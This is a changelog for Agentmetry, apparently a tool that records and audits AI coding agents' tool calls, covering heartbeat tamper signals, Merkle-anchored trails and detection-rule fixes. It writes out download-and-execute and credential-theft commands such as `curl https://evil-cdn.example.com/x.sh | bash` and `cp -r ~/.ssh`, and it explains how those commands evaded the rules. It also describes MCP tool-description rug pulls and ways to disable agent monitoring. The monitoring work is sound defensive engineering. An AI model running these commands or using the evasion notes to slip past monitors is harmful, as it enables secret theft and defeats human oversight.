# Changelog

All notable changes to Agentmetry are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project aims to
follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html) once out of
alpha. While in **public alpha**, minor versions may carry breaking changes to
APIs and integration surfaces. The canonical event schema is versioned
separately (currently `1.2.0`) and changes additively.

## [Unreleased]

## [0.5.0] - 2026-08-21

### Added

- **Coverage attestation on a heartbeat.** A hook lives in a file the developer
  owns: `.cursor/hooks.json` can be deleted, `claude --no-hooks` skips it, the
  orchestrator can be stopped. No user-space recorder prevents that, and the
  honest answer to "what stops my developer removing this" is that removal
  changes what the recorder says about itself.

  "Alert when a machine stops sending events" does not work, because idle and
  disabled both emit nothing and silence is not evidence. So the recorder
  attests on an interval whether or not anybody is coding, and carries what it
  is wired to rather than only a timestamp. The beat covers every agent surface
  that has an installer, in four states rather than a boolean, because "the hook
  was removed" and "this agent was never installed here" deserve opposite
  responses. A fleet that learns the tamper signal is always on has no tamper
  signal left.

  Each beat also carries `trail_merkle_root` and `trail_tree_size`, so a root
  lands in the SIEM on an interval, outside the audited machine's blast radius.
  An edit below that tree size then produces a root that no longer matches a
  value the machine can no longer reach. Measured at 646ms over 17,480 records,
  a 0.2% duty cycle at the default 300s beat.

- **`agentmetry mcp`**: an inventory of what the agents on this machine are
  wired to. Agentmetry recorded what an agent did and could not answer the
  question a security reviewer asks first, which is what that agent was allowed
  to reach. `doctor` reports it too.

- **MCP schema fingerprinting**, because the config digest cannot see a rug
  pull. `mcp_config_digest` hashes the configured command line, which catches
  "somebody added an MCP server on that laptop" and misses the attack that
  matters: `postmark-mcp` shipped fifteen clean versions and then changed what
  `tools/list` returned. The payload lives in the description the model is
  handed and never appears in `mcp.json`.

  The beat now carries a digest over every observed `tools/list` beside the
  config digest, so the SIEM rule is a conjunction: schema digest moved, config
  digest did not. No new detection rule, so the frozen ruleset and the dogfood
  gate are untouched.

  The recorder does not spawn servers to collect this. `npx -y` on a five minute
  beat would fetch and run whatever the registry currently serves, which is the
  attack, performed by the recorder. Until a client has listed tools the digest
  is empty, which is an honest gap rather than a green dashboard.

- **Google SecOps forwarding as UDM** rather than raw logs. Posting to
  `unstructuredlogentries` would require a normalization parser in the
  customer's tenant: a second implementation of this mapping, in another
  language, versioned separately. When the two drift the failure is silent,
  because events keep arriving and quietly stop populating the fields the
  detections key on. This posts UDM directly to `udmevents`, which is also
  Google's own guidance.

- **The ATT&CK classification now lands in ECS `threat.*`**, the fieldset
  Elastic's prebuilt content and Navigator coverage layers actually join on. It
  had only ever been written into the vendor namespace, so a customer's existing
  ATT&CK dashboards saw nothing. `threat.framework` is always `MITRE ATT&CK`
  there; ATLAS ids deliberately do not enter that fieldset.

- **MITRE ATLAS labels on the AI-specific subset**, for the half of the threat
  model ATT&CK has no id for. Tool-level mappings for credential access, egress
  and destruction; `AML.T0109` on the MCP rug-pull signature; and a
  detection-level block on `untrusted-input-then-risky-action`
  (`AML.T0051.001`, indirect prompt injection). Ids are resolved by name against
  ATLAS 2026.07, format 6.0.0, rather than hardcoded, which caught two mistakes
  during authoring. Optional YAML override with id validation. Five techniques
  out of 178, published as five out of 178.

- **`agentmetry hooks status`**: coverage as an exit code, for Intune
  Remediations and every scheduled check shaped like it. Parsing `doctor` output
  worked until somebody reworded a line, and a fleet coverage check that breaks
  silently on a wording change is worse than no check.

      0  every agent present here is recorded, or none is installed
      1  an agent is present and not recorded, and installing hooks fixes it
      2  coverage cannot be determined, and installing hooks does not fix it

  2 is deliberately not folded into either neighbour: a service profile sees no
  developer configuration at all, calling that compliant is the lie this
  subsystem exists to prevent, and calling it remediable loops forever against
  something an install cannot fix.

- **A Codex installer**, the one supported agent that never had one. It writes
  absolute paths like every other installer and merges non-destructively into
  `~/.codex/hooks.json`. Deliberately not wired into boot: Codex trusts hooks by
  hash and skips untrusted ones silently, so an install nobody asked for would
  sit there looking installed and capturing nothing. Installing Codex is a
  decision with a step only a human can complete, and the script says so.

- **Capture that does not require a git checkout.** An MSI machine ran the
  recorder, captured nothing, and nothing said so. Ingest lived only at
  `scripts/agentmetry_ingest.py`; the MSI ships a frozen binary and no repo, so
  the command a hook config named did not exist on the machine. Every installer
  checked for that file, did not find it, and declined. Service up, dashboard
  green, zero tool calls recorded, which is the silent-coverage failure this
  product exists to detect, shipped inside the product.

  The module moved into the package as `agentmetry.hooks.ingest` so it travels
  in the wheel and in the frozen binary. `scripts/agentmetry_ingest.py` stays
  forever and forwards, because hooks already installed on developer machines
  name it by absolute path and those configs are not ours to rewrite.

- **Detection**: secret-manager CLIs and single-quoted inline scripts are now
  recognised.

- **External anchoring for the trail** (`agentmetry anchor`), closing the gap
  [#34](https://github.com/blitzcrieg1/agentmetry/issues/34) named. The hash
  chain and the Merkle root are both computed on the audited machine from the
  audited file, so an attacker with write access to the data directory can edit
  an event, recompute every hash after it, rewrite the sidecar head, and hand
  over a trail that verifies cleanly. That is the ceiling of what a
  self-contained file can prove about itself.

  A checkpoint commits `(tree_size, root_sha256)` to somewhere the host does not
  control; any later edit below that size stops matching. The trail never
  leaves, because a Merkle root over hashes discloses nothing about the events.

  `AnchorSink` is a one-method protocol. This repo ships `FileAnchorSink` (a
  local append-only log) and documents attaching a git remote, an RFC 3161
  timestamp authority, or WORM storage in [anchoring](docs/anchoring.md).
  Choosing an anchor means choosing whom you trust to hold history, and picking
  one on the operator's behalf would be making that decision for them.

- `verify --trail --anchors <path>` checks against an anchor log somewhere other
  than beside the trail, `AGENTMETRY_ANCHOR_LOG` sets that path once so neither
  `verify` nor `doctor` needs the flag, and `scripts/publish_anchor.ps1` runs the
  whole loop (checkpoint, commit, push, verify against the published copy) on a
  schedule. An operator who has to remember a flag to get the real check is an
  operator who will end up running the fake one.

  `doctor` reports coverage, fails hard when the trail contradicts a published
  anchor, and stays **silent** when no anchor log is configured. An unanchored
  trail is a legitimate configuration and the chain still does real work; a
  daily warning about it would be a nag about a choice, and nags are what teach
  an operator to stop reading the report. A *configured* log that has gone
  missing does warn, because that is an intention that stopped working rather
  than a decision.

  Without `--anchors` the check compares the trail to a log an attacker who
  rewrote one had every opportunity to rewrite as well, which establishes that a
  file agrees with itself.

  Agentmetry's own trail is now anchored at
  [agentmetry-anchors](https://github.com/blitzcrieg1/agentmetry-anchors) with
  force-push and deletion blocked. Note that GitHub offers branch protection
  free on public repositories and behind a paid plan on private ones, so an
  unprotected private anchor repo is the failure mode to avoid: the workstation
  in this threat model holds the credential that can rewrite it.

### Fixed

- **Seven installers pointed at a path deleted in 0.4.0, and reported success.**
  Every installer delegating to `hook_bootstrap` invoked a path that stopped
  existing when the package moved under `agentmetry/`. It went unnoticed because
  Cursor and Claude self-install at boot, so the two agents anyone would test
  kept working, while Qwen, Kimi, Qoder and CodeBuddy have no other install path
  and were simply unreachable.

  The failure shape mattered more than the path. `$ErrorActionPreference =
  "Stop"` does not trip on a native command's exit code, so python printed
  "can't open file", returned 2, and the script carried on to announce that
  hooks were merged. A developer ran the installer, was told they were covered,
  and had none. Both halves are fixed.

- **Codex and Antigravity were reported as unverifiable, and both were wrong.**
  A missing PowerShell installer is not the same fact as missing support, and
  reporting unknown for a surface that can be checked hides a real uncovered
  machine. On the maintainer's own machine the wrong registry reported
  Antigravity absent while it was covered, and Codex unknown while it was
  installed and unrecorded.

- **The heartbeat attested two agent surfaces while six installers shipped.**
  Both the beat and `doctor` hardcoded `~/.cursor` and `~/.claude`, so a machine
  running Codex, Qwen, Kimi, Qoder or CodeBuddy unrecorded still beat green. Two
  copies of the same list, neither compared against anything. The registry now
  lives in one module both callers read, and a test fails if an installer is
  added without a row.

- **One finding, one row.** A detection could be emitted twice for the same
  sequence when an inferred approval event re-ran the engine over a window that
  had already produced it. Findings are now deduplicated per correlation and
  rule within a batch.

- **The hook target that gates the install is now the target that writes the
  command.** The two were derived from different roots, so a check could pass
  against one path while the command written named another.

- **The trail chain locks across processes**, not only across threads. Two
  orchestrator processes appending concurrently could interleave and produce a
  chain that failed its own verification.

- **The canonical form is injective**, so two distinct events cannot produce the
  same record hash.

- **A carriage return is not a ruleset change.** Line-ending normalisation was
  moving the ruleset fingerprint on Windows checkouts, which reset the dogfood
  gate over a whitespace difference.

- **Four detection rules matched command words against raw command text**, so a
  commit message that merely *described* a dangerous command could fire on it.
  Found by triaging a real critical finding rather than by a test: a legitimate
  `.env` read, then six hours later a commit message documenting `az keyvault`
  and `aws secretsmanager` support, produced `credential-read-then-cloud-api`.
  The commit event carried no `cloud_api` trait; the rule bypassed the
  classifier and grepped the text.

  `_CLOUD_API`, `_GIT_EXFIL`, `_DELETE_COMMAND` and `_UNTRUSTED_INPUT_COMMAND`
  now read `_command_words()` (quoted content and heredoc bodies blanked) like
  every other command-word pattern. Raw text is still correct for URLs, IPs,
  file paths and command equality, and `_command()` now says which is which.

  This is the second time the same distinction was got wrong; `_command_words`
  was written for the first. A tool whose own commit messages page its owner is
  a tool whose alerts get muted, so the regression is pinned three ways: unit
  tests per rule, a corpus case replayed from the real session, and one test
  asserting the property against the patterns directly so a fifth call site
  cannot reintroduce it quietly.

### Changed

- **Canonical event schema bumped to 1.2.0**, additively. The `atlas` block on
  detections and the `threat.*` promotion in ECS are both additions; nothing was
  removed or renamed. `SCHEMA_VERSION` had also existed while four builders
  emitted the literal string, so the version now has one source of truth.

- The hook path no longer does filesystem work on every tool call.

- `verify --trail` now reports **anchored and unanchored ranges separately**. A
  checkpoint covers the records that existed when it was published; calling the
  whole trail anchored because one checkpoint exists would overstate it. An
  unanchored tail is not a failure, it is the normal state of a running
  recorder, and scoring it red would make the check cry wolf until somebody
  turned it off. When a checkpoint does not match, a rewritten range and a
  truncated one are reported as the different incidents they are.

- Bare uses of **"tamper-evident"** replaced with the precise claim:
  hash-chained and verifiable, with optional external anchoring for threat
  models that include the host itself. The phrase promised a compliance reader
  more than the file could deliver, and the reader least able to check was the
  one most likely to rely on it.

## [0.4.0] - 2026-08-07

**The first release you can actually `pip install`.** Every earlier version
either was never published or, in 0.3.0's case, would have written `core`, `api`
and `cli` into site-packages. `pip install agentmetry` now works, and
`agentmetry doctor` opens with no failures on a clean install.

Published by a tagged GitHub Actions run using PyPI Trusted Publishing, which
means the artifact is built from a clean checkout of the tag rather than from
whatever happened to be in a laptop's `dist/`. That is not process theatre: the
artifacts nearly published by hand were four days old and carried 20 corpus
files against a tree with 46, missing every detection fix below.

### Added
- **Merkle inclusion proofs over the trail.** The hash chain answers "has this
  file been altered". It cannot answer "did this event happen" without handing
  over the whole file, because every record's hash depends on the one before it.
  For an audit that is the wrong shape: proving one tool call should not
  disclose a month of unrelated work.

  `agentmetry prove <trail> --seq N` emits an RFC 6962 inclusion proof;
  `--check` verifies one, ideally against a root recorded elsewhere. On a real
  trail that is 1.2 KB against 8.3 MB. `verify --trail` now prints the root.

  Additive by construction: leaves are the `record_sha256` values the chain
  already writes, so every trail ever produced is compatible and nothing
  migrates. Leaf and internal nodes are domain-separated (RFC 6962 §2.1) and the
  tree splits at the largest power of two below `n` rather than padding or
  duplicating the final node; without those two properties an internal node can
  be presented as a leaf, and two different logs can share a root.

  It does not solve external anchoring (#34). A root only you hold is still a
  file you could rewrite, and `--check` says so rather than implying otherwise.

- **CloudEvents v1.0 export.** `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=cloudevents`
  wraps each event in a structured envelope for Knative, EventBridge, Event
  Grid, Dapr or Kafka. The canonical event travels whole in `data`. Default
  stays `canonical`, because an option appearing must not change the shape an
  already-wired webhook receives.

- **Ingest Microsoft Agent Governance Toolkit audit files.**
  `agentmetry import-agt <file> --key K` verifies AGT's hash chain and HMAC
  signatures, then runs sequence detection over it. AGT decides allow or deny
  per call; this says what a session of those calls adds up to. On a file
  produced by AGT's own `FileAuditSink`, three individually-permitted calls
  raised one critical `credential-exfil`.

  Verified before ingest, never after: appending an unchecked record into a
  hash-chained trail would make the chain vouch for a claim nobody checked.
  Ingested events carry `source.tier=external` and
  `provenance.captured_by=agent-governance-toolkit`, because Agentmetry read
  that record rather than observing the calls, and a trail that cannot tell the
  difference asserts more than it knows.

- **The dogfood gate now notices when the rules changed underneath it.**
  `dogfood --start` records a fingerprint of everything that decides whether a
  detection fires and how hard: the detection engine, rules, traits and MITRE
  sources, plus the YAML manifest. `dogfood` compares it on every run.

  Three detection changes shipped into week one on the day the clock started.
  Each was an improvement. Together they meant the week measured three different
  products, and nothing said so. The gate exists to produce a number worth
  quoting, and four green weeks measured against four rulesets is not that
  number.

  A drifted ruleset does not turn individual weeks red, because the operator's
  behaviour that week was real. It does stop the run passing, and the report
  names the fix. Whole-file hashing is blunt on purpose: it flags a comment-only
  edit, and it cannot miss a real change. A marker written before fingerprints
  existed is treated as unknown rather than drifted.

- **Spool depth and age are now visible.** `GET /api/v1/audit/status` reports
  `spool_pending` and `spool_oldest_age_seconds`; `doctor` **fails** above 100
  pending or 24h old, naming how long remains before the oldest become
  unreplayable; and the dashboard's feed status bar replaces the freshness label
  with a pending-replay count. "Last event 2m ago" beside a thousand unreplayed
  events is a true statement that leaves a false impression.

- **`agentmetry dogfood`** — scores the four-week beta gate from the trail.
  A week is green when the recorder ran on at least three days, the chain
  verifies, every critical or high detection was dispositioned, and nothing is
  stuck in the hook spool. `--start` records the clock.

  The gate went unstarted for weeks, and the reason was mechanical rather than
  motivational: answering "was this week green?" meant a twenty-minute manual
  checklist, so it never got asked. This makes it one command. Volume is
  deliberately not a criterion; a slow week is fine, a week the recorder missed
  is not, because an empty trail from a switched-off recorder looks exactly like
  an empty trail from a quiet developer.
- **Dashboard dogfood gate + Analytics drill-down.** Clickable weekly stats
  (Denied / DLP / Policy / Detections) open Event stream or Detections with
  server-side `GET /audit/tail?focus=…` over the last 7 days, so counts match
  visible rows. Fleet vs this-session scope toggle; hunt focus survives tab
  switches until Clear.
- **`GET /audit/tail?focus=`** — `denied` | `dlp` | `policy` | `detection`,
  sharing the same SQL predicates as `/audit/stats`.

### Fixed
- **The detection engine had systematic evasion holes** (#40, #41, #42, #43).
  None exotic; each took under a minute to construct, and all four were found by
  auditing the engine rather than by a detection firing:

  - `echo $AWS_SECRET_ACCESS_KEY` was generic Execution. Credential recognition
    described only file paths, so the way every container and CI runner holds
    secrets was invisible and `credential-exfil` could not fire on the modal
    cloud exfil chain.
  - `python -c "urllib.request.urlopen(...)"` earned no egress tag. The network
    client list was curl, wget, nc and friends; in a hardened image curl is
    often absent and a language runtime never is.
  - `bash <(curl -fsSL ...)` fetches and executes with no pipe, so every cradle
    check looking for `|` missed it.
  - `cp -r ~/.ssh /tmp/k` produced no traits at all. The private-key pattern
    required a separator after `.ssh`, so a named key matched and the directory
    holding every key did not, which made the broadest theft the one that got
    through.
  - `credential-exfil` could not fire when the read and the send were one
    command, because it only looked at events *after* the credential read.
  - `remote-staging-then-execute` knew seven staging hosts, and a domain costs a
    few euros. It now matches any remote host when the downloaded basename is
    the executed basename: not "fetched something, later ran something", which
    is a working day, but "ran the thing just fetched".

  Underneath sat the real defect: credential recognition existed twice, and the
  sequence rules read only the MITRE tag, so the mapper was the only opinion
  that counted while being the one with less information and no corpus. A bare
  `.env` in its pattern list tagged the module path
  `agentmetry.core.diagnostics.env_file` as credential access and manufactured
  the credential half of two critical findings. `traits.py` owns the patterns
  now and `mitre.py` imports them.

- **False positives on writing about security** (#24, #41). Trait regexes match
  command text and cannot tell performing an action from writing about one.
  Matching now follows shell semantics: the verb must be unmasked, the arguments
  may be quoted. `echo 'curl x | bash' >> notes.md` and
  `git commit -m "docs: explain .env handling"` stay silent, while
  `curl "https://host/x.sh" | bash` still fires, because quoting a URL is simply
  how people write it.

- **Autostart was registered and failing.** The scheduled task still launched
  `-m cli serve`, a module the package rename had removed, so it exited 1 every
  sixty seconds while `doctor` reported OK and 60 events piled up in the spool.
  `doctor` now fails a registration that does not work, and
  `agentmetry install` no longer answers "already configured" to a broken one.
  Health is read from the task's status rather than its last result, because a
  long-running task logs a non-zero result on every keep-alive tick.

- **Eight launchers still named pre-rename modules** (`scripts/agentmetry.bat`,
  `install.ps1`, four `.bat` files, `seed_demo.py`, `.claude/launch.json`). A
  module path inside a string is invisible to the type checker, the linter and
  the import system alike, so each waited for a human to trip over it. A test
  now walks every launcher and asks the import system whether the module
  resolves; it found two that a grep had missed.

- **Writing `gh pr merge` into a file read as merging a pull request** (#24).
  A command whose *content* was `gh pr merge 42 --squash` fired
  `pr-merged-without-review` at critical. Nothing was merged: the text was being
  written into a test fixture.

  Trait regexes match command text and cannot tell performing an action from
  writing about one. That lands hardest on the people most likely to adopt this:
  anyone authoring detection content, security documentation, or corpus cases
  spends the day typing the exact strings the rules hunt for, and a security tool
  that punishes you for writing about security gets uninstalled.

  The PR traits now read a copy of the command with quoted strings and heredoc
  bodies blanked out, so `echo "gh pr merge 42" > f`, `printf ... | tee f`,
  `git commit -m "...gh pr merge..."` and heredoc'd fixtures no longer set
  `pr_merge`, while `gh pr merge 42 --squash` and `git merge origin/main` still
  do. Masking preserves offsets rather than deleting, so callers can still locate
  a match in the original.

  Applied only to the three PR traits for now. The same confusion exists for
  other text traits, but a general fix means parsing shell quoting properly, and
  each trait wants its own corpus case before its semantics change. Anything the
  heuristic cannot account for stays visible, so the failure mode is a trait that
  still fires rather than one that silently stops.

- **`encoded-command-download` fired critical on piping a loopback service into
  an interpreter** (#38). `curl http://127.0.0.1:8000/... | python` has the exact
  shape of a download cradle and none of the substance, and developers query
  their own services that way several times an hour. A critical that fires that
  often becomes the alert people scroll past, so the rule loses its reader before
  a real cradle ever appears.

  A new `pipe_to_shell_local` trait marks pipes whose every URL is loopback, and
  the rule reports those at low with `T1059` only. No `T1105` and no `TA0011`:
  both mean content arriving from outside, and claiming either for a loopback
  fetch would put a false ATT&CK mapping in front of an analyst. It is downgraded
  rather than suppressed, because staging a payload on a local port and then
  executing it is a real technique.

  Loopback is excluded specifically rather than remote being required, which
  preserves an earlier fix: demanding a bare IP once let
  `curl https://evil-cdn.example.com/x.sh | bash` through, and a domain is what a
  real attacker uses. A command whose URL cannot be read, such as
  `curl $URL | bash`, is treated as remote.

  Corpus gains both halves, and the cradle tests now assert severity rather than
  only that something fired: a careless fix treating every pipe as local would
  otherwise still "detect" a real cradle, at low, and pass.

- **Replayed events were stamped with the time of the replay, not the time of
  the tool call.** The hook sent no timestamp, so the orchestrator fell back to
  its own clock. That is accurate to the millisecond while ingest is live and
  wrong by up to a week when it is not. Draining a five-day spool therefore
  recorded 1,880 events as having happened inside a three-minute window.

  Two consequences, both serious. Every sequence rule keys on "A then B within N
  minutes", so unrelated events days apart became correlated: one drain produced
  twelve detections including two criticals, and reconstruction showed the
  "correlated" sequences actually spanned 4 days 6 hours and 1 day 9.5 hours.
  And a record whose entire purpose is to say when things happened was saying it
  wrongly.

  The hook now stamps `timestamp_utc` at capture, so live and replayed events
  are equally accurate. Replay also backfills from the spool's `spooled_at` for
  entries written by older hooks, and never overwrites a timestamp the hook
  supplied.

- **The hook spool could delete events it had never replayed.** Draining read the
  whole file, replayed it, then unlinked the path. A drain of a few thousand
  events takes minutes and the hooks keep appending throughout, so the unlink
  destroyed everything captured during the drain. The spool is now rotated aside
  first: hooks immediately begin a fresh file and only the rotated copy is ever
  removed. A drain interrupted by a crash resumes from the rotated file instead
  of losing it.

- **The spool drained only at boot, so a backlog could grow unnoticed for days.**
  Nothing supervises the orchestrator on the OSS install path, so hooks kept
  capturing into a spool that nothing came back for. Found in real use: 1,880
  events across five days, still growing, with a dashboard that looked healthy
  because an empty feed and a stopped recorder rendered identically. Draining
  now runs on a timer for as long as the process lives.

- **Boot draining held the ingest port closed.** Awaiting the drain inside the
  application lifespan meant every hook firing during a large drain was refused
  and spooled, making the next drain larger. The boot drain is now a background
  task, so the recorder is reachable first and catches up second.

- **Expired payloads are quarantined rather than discarded.** Payloads past the
  seven-day replay window still cannot be replayed, because injecting a week-old
  tool call into today's correlation window invents sequences that never
  happened. They now move to `hook-spool.expired.jsonl`. A gap in an audit trail
  is a fact about the audit trail, and this product does not get to quietly
  forget one.

- **Autostart was Windows-only, had no restart policy, and told nobody it
  existed.** `agentmetry install` registered a logon task with no recovery, so a
  crashed recorder stayed dead until the next logon; on Linux and macOS it
  printed "Windows-only" and exited. Worse, nothing ever reported whether it had
  been run. On the machine where this was found it never had been, which is how
  five days of capture ended up in the spool behind a healthy-looking trail.

  It now registers a self-healing task on Windows (via a task definition rather
  than the limited `schtasks` flags), a `Restart=always` systemd user unit on
  Linux, and a `KeepAlive` launch agent on macOS. The Windows keep-alive is a
  repeating trigger plus `IgnoreNew`, not `RestartOnFailure`: despite the name,
  that setting covers a task which fails to launch, not one whose process dies
  later. Verified by killing the recorder and watching it come back on its own
  inside a minute.
  `agentmetry uninstall` reverses whichever applies. Packaged builds refuse and
  say why: the installer already supervises them, and a second registration
  would race it. `doctor` now warns when nothing will restart the recorder and
  names the command that fixes it.

### Changed
- **Detection corpus grows from 20 cases to 46** (22 benign, up from 6). Seven
  benign sessions put a 95% confidence bound on the false-positive rate at
  roughly 41%, which is not a rate, and it was the weakest number in the README.
  It is now about 19%. Rule coverage goes from 9 of 15 to 13.

  Every new attack case is paired with the near-miss that must stay silent:
  autonomous writes before an approval against the same writes after one; three
  deletions against the five-deletion threshold; fetch-then-egress against
  fetch-then-edit; downloading a file and running it against downloading a
  schema and running a repo script. A threshold that drifts now breaks a benign
  case instead of surfacing quietly in production.

  `corpus.yaml` states what the number is: a regression guard that the rules
  stay quiet on ordinary work, not a field false-positive rate. The field rate
  is what the dogfood run reports, over traffic nobody chose.

- **Everything moved under one top-level `agentmetry` package, and the
  distribution is now `agentmetry` rather than `agentmetry-orchestrator`.**
  `pip install` previously would have written `core`, `api` and `cli` into
  site-packages: three of the most generic importable names in Python, colliding
  with whatever else claims them. Imports change from `core.audit...` to
  `agentmetry.core.audit...`. Breaking, and the reason this is a minor bump
  rather than a patch.

  The version moves with it. Tag `v0.3.0` points at the old flat layout, so
  publishing 0.3.0 to PyPI would have made one version number mean two different
  trees, and evidence packs record the producing version. `meta.producer` now
  reads `agentmetry/0.4.0`.

  The policy manifests moved inside the package too, for the same reason and
  with a sharper edge: without them DLP, tool policy and the YAML detection
  rules are all inert, so `pip install` produced a `doctor` opening with three
  FAILs and secret scanning silently off. They now live at
  `agentmetry/policies/`. `python -m build` builds the wheel from the sdist, and
  a force-include reaching outside the project directory does not survive that
  trip, so config the package needs to run had to live with the package.

  The detection corpus moved inside the package. `agentmetry benchmark` is the
  command the README tells a stranger to run to check the false-positive claim,
  and it failed from a clean install because the corpus lived under `tests/`,
  which no wheel ships.

## [0.3.0] - 2026-07-26

### Added
- **Detection triage.** Detections now carry a disposition (`new`,
  `acknowledged`, `in_progress`, `resolved`, `false_positive`, `risk_accepted`)
  with an assignee and a note, set from the dashboard or
  `POST /api/v1/audit/detections/disposition`. Every change appends an
  immutable entry to the canonical trail as a `detection_disposition` event, so
  the decision is evidence on the same hash chain as the finding. This closes
  the corrective-action half of ISO/IEC 42001 cl. 10 and EN 18286 cl. 8: the
  compliance digest previously asked for a triage note the product could not
  store.
- **`agentmetry export --compliance-digest`** — a period digest for ISO 42001 /
  EU AI Act evidence review, reporting inferred-approval share, detection
  disposition, control modes and trail-chain state. It states plainly when a
  period evidences detection rather than prevention.
- **Hook event spool.** When the orchestrator is unreachable the hook writes
  events to a local spool (7-day, 32 MB bounded) and the orchestrator drains it
  at boot, so an agent session during a restart is no longer a hole in the
  trail.
- **Unattended-agent policy** (`block_unattended_agent_flags`) — flags such as
  `--yolo` and `--dangerously-skip-permissions` on any binary, plus Hermes,
  OpenHands, aider, goose and opencode coverage in
  `block_agent_cli_weaponization`.
- **Hermes IoC** — `agent_result_dump_dir` DLP rule for the result-dump
  directory used in the July 2026 Hermes agent intrusion.
- **EN 18286:2026 mapping** — [`docs/compliance/en-18286-mapping.md`](docs/compliance/en-18286-mapping.md),
  routed through Annex ZA to EU AI Act Arts. 11, 17 and 72.
- **Open-core extension point.** Commercial packages register through the
  `agentmetry.extensions` entry point; see
  [`docs/architecture/extensions.md`](docs/architecture/extensions.md).
- **Windows CI.** The orchestrator suite runs on `windows-latest` as well as
  `ubuntu-latest`. A Windows-only path bug had already shipped once because CI
  never exercised it.
- **Dashboard tests.** Vitest smoke coverage for the detection, event and
  triage surfaces, run in CI.
- **Detection benchmark** (`agentmetry benchmark`). A corpus of 17 recorded
  sessions, 12 attack and 5 benign, replayed through the real rule engine, with
  expectations written by hand rather than pasted from current behaviour. CI
  fails on any missed rule or any false positive.

  It exists because two real defects shipped past 546 passing tests on
  2026-07-25: sequence ordering decided by a random UUID on a timestamp tie, and
  off-hours detection silently using UTC on Windows. Neither was reachable by a
  unit test that hand-builds events with distinct timestamps in a clean
  environment. Two corpus cases pin exactly those conditions; reintroducing the
  ordering bug makes the benchmark exit non-zero.

  The benign half is the point. A published false-positive count is worth more
  than an asserted detection count, and anyone can reproduce it from a clean
  clone.
- **Sigma rule for untriaged critical detections**
  (`docs/integrations/sigma/agentmetry_critical_detection_untriaged.yml`), with
  the backend anti-join written out for Splunk, Elasticsearch and Loki. An
  untriaged detection is the health metric for the deployment.
- **Fleet guide** — [`docs/integrations/fleet-via-siem.md`](docs/integrations/fleet-via-siem.md):
  running Agentmetry across a team using the SIEM you already operate, with the
  four queries worth alerting on, measured storage sizing, and an explicit
  statement of what it does not give you (no central enforcement, no central
  triage, no visibility into unorchestrated agents).

### Security
- **The enterprise MSI installed an unauthenticated remote API.** It set
  `AGENTMETRY_HOST=0.0.0.0` and registered a LocalSystem service bound to all
  interfaces, while `require_api_key` is deliberately a no-op when no key is
  set, and the MSI set none. Anyone able to reach the host could read the trail,
  download the evidence pack, inject forged events into the tamper-evident
  chain, and close detections as `risk_accepted` — a decision then recorded as a
  legitimate human action. The MSI now binds `127.0.0.1`, and
  `agentmetry doctor` **fails** on a non-loopback bind with no API key, so any
  future packaging that repeats the combination is caught.

### Fixed
- **A rule rename orphaned every disposition recorded against it,** and deleting
  a rule left decisions pointing at nothing. Both failures were silent, and both
  made a reviewed period read as unreviewed, which is the opposite of what the
  triage loop exists to prove. Renames are now declared in `RULE_ALIASES`, keys
  canonicalise through it, and a row written under an old name migrates to the
  new one on the next decision rather than forking into two. Dispositions whose
  rule has been retired are kept as evidence and surfaced by `doctor` instead of
  being dropped. An unknown `rule_id` is refused at the write boundary, so a
  typo cannot become an orphan; replay stays permissive, because the trail is
  the record and an event naming a retired rule still happened.
- **Sequence-rule ordering was decided by a coin flip on a timestamp tie.** The
  tie-break ended with `event_id`, a random UUID, so "did A happen before B" —
  the question every sequence rule asks — was answered at random whenever two
  events shared a timestamp. Ties are common: Windows clock granularity is about
  15 ms, so two tool calls in one agent turn routinely collide. Ordering now
  falls back to arrival order, which the trail supplies. The README's claim that
  ordering is enforced by position rather than co-occurrence is true again.
- **Off-hours detection used the wrong clock on Windows.** Windows ships no IANA
  timezone database, so `AGENTMETRY_BUSINESS_TZ` could not resolve and the rule
  silently fell back to UTC: a 14:00 New York action was reported as
  out-of-hours, and a genuine 03:00 action could pass as business hours.
  `tzdata` is now a Windows dependency, and the fallback logs a warning instead
  of being silent.
- **Boot-time disposition replay could erase triage history.** Wiring
  `rebuild_from_trail()` into startup made an unconditional index wipe run on
  every boot, so a pruned, rotated, restored or repointed trail silently deleted
  every disposition. The findings survived, so the period read as *untriaged*
  rather than *unknown*, which is backwards for ISO/IEC 42001 cl. 10 evidence. A
  rebuild that cannot account for a key already in the index now refuses
  (`DispositionRebuildRefused`); boot logs the refusal and carries on.
- **Replayed dispositions lost their `event_id`,** so a rebuilt row could not be
  traced back to the trail line that recorded the decision.
- **`host_id` was resolved per event.** It is cached again; a hostname does not
  change under a running process.
- **Evidence packs were exporting the wrong store.** `build_evidence_pack` still
  read the removed governed runtime's outbox, so the flagship EU AI Act export
  contained driver-mount noise while thousands of real captured events sat
  unexported. It now reads the canonical audit trail. Pack schema is **2.1**,
  adding `tool_calls`, `approvals` (with an explicit `inferred` flag),
  `detections` with the triage state in force, `dispositions`, a `controls`
  snapshot with policy-manifest hashes, `meta.producer`, and the trail-chain
  head.
- **Burst rules had no clock.** `session-tool-burst`, `destructive-delete-burst`
  and the swarm rules counted events across a whole session rather than a time
  window, so a long normal session eventually tripped them. They now measure the
  densest window.
- **Host detection checkpoints never expired,** so one host-level firing
  silenced that rule on that host permanently. Checkpoints now age out after 6
  hours.
- **`SubagentStop` was mapped to `session_end`** on the parent correlation,
  which flushed the parent's still-pending approvals as inferred-denied in the
  middle of a live session. It is now a `tool_called` lifecycle marker.
- **Claude Code subagents were invisible to the swarm rule.** Claude spawns
  through the `Task` tool and emits no `SubagentStart`, so the most used agent
  CLI was the one blind spot. `Task` calls are now tagged `subagent_start:<type>`
  and excluded from the generic tool-burst count.
- **Kimi `stream-json` recorded every call as a success** and never closed the
  turn. Results are now buffered by `tool_call` id and honour `is_error`,
  unresolved calls are flushed at EOF, and `Interrupt` ends the session.
- **`aws_secret_key` DLP matched no real key.** The pattern relied on `\b`
  against `AWS_SECRET_ACCESS_KEY`, where `_` is a word character, and did not
  survive the JSON escaping the scanner sees. It is now anchored on the
  assignment and no longer fires on 40-character git SHAs.
- **`agentmetry doctor` failed on a missing demo vault** for a SIEM-only
  install. It now checks the recorder path first (trail chain, spool, detection,
  manifests, hooks) and treats vault and drivers as optional warnings.
- **Disposition events carried no `host_id`,** so a fleet forwarding to one SIEM
  could not attribute a decision. "Somebody accepted this risk" is not an answer.
- **Version drift.** `pyproject.toml` and the API advertised 0.2.0 while 0.2.1
  was tagged and shipped. The version now has one home (`core/version.py`), the
  API and evidence-pack `meta.producer` read it, and a test fails if it
  disagrees with the newest CHANGELOG section.

### Changed
